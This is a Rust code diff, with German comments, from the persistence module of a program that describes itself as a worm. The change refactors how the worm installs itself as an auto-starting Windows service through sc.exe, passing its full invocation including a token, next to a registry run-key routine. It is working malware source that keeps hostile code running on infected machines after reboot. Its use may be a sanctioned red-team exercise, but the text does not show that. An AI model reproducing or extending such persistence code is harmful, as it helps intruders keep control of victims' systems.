@@ -3,10 +3,11 @@
 //! Stellt sicher, dass der Wurm nach Reboot weiterhin aktiv ist.
 //! Auf Nicht-Windows-Plattformen sind die Funktionen als Stubs implementiert.
 
-use std::path::Path;
 use tracing::debug;
 #[cfg(target_os = "windows")]
 use tracing::warn;
+
+use kx_core::persist::Invocation;
 
 use crate::error::WinError;
 
@@ -70,18 +71,17 @@ pub async fn create_registry_run_key(name: &str, executable: &str) -> Result<(),
 /// Installiere den Wurm als Windows-Dienst.
 ///
 /// Nutzt sc.exe für die Dienst-Registrierung. Der Dienst startet beim Hochfahren.
+///
+/// Die `binPath=`-Zeile trägt die **vollständige** Invocation: Binary und alle
+/// Argumente. Ohne sie startet der Dienst nicht — die Pflichtargumente
+/// `--start`, `--end` und `--server-cert` fehlen, und clap lehnt den Start ab.
+/// Die Werte aus `env` sind unter Windows in der Befehlszeile aufgelöst
+/// (`sc.exe` kennt keine Environment-Datei) — das Token steht damit in der
+/// Prozessliste. Das ist eine Eigenheit von Windows-Diensten und keine
+/// Besonderheit dieser Form.
 #[cfg(target_os = "windows")]
-pub async fn install_service(
-    service_name: &str,
-    binary_path: &Path,
-    display_name: &str,
-) -> Result<(), WinError> {
-    let path = binary_path
-        .to_str()
-        .ok_or_else(|| WinError::Service("ungültiger Pfad".into()))?;
-    let sc_create = format!(
-        "sc.exe create {service_name} binPath= \"{path}\" start= auto DisplayName= \"{display_name}\""
-    );
+pub async fn install_service(invocation: &Invocation, display_name: &str) -> Result<(), WinError> {
+    let sc_create = kx_core::persist::windows_service_command(invocation, display_name);
     let output = tokio::process::Command::new("cmd.exe")
         .arg("/C")
         .arg(&sc_create)
@@ -136,8 +136,7 @@ pub async fn create_registry_run_key(_name: &str, _executable: &str) -> Result<(
 /// Installiere den Wurm als Windows-Dienst (nur Windows).
 #[cfg(not(target_os = "windows"))]
 pub async fn install_service(
-    _service_name: &str,
-    _binary_path: &Path,
+    _invocation: &Invocation,
     _display_name: &str,
 ) -> Result<(), WinError> {
     debug!("Windows-Dienste nur auf Windows verfügbar");
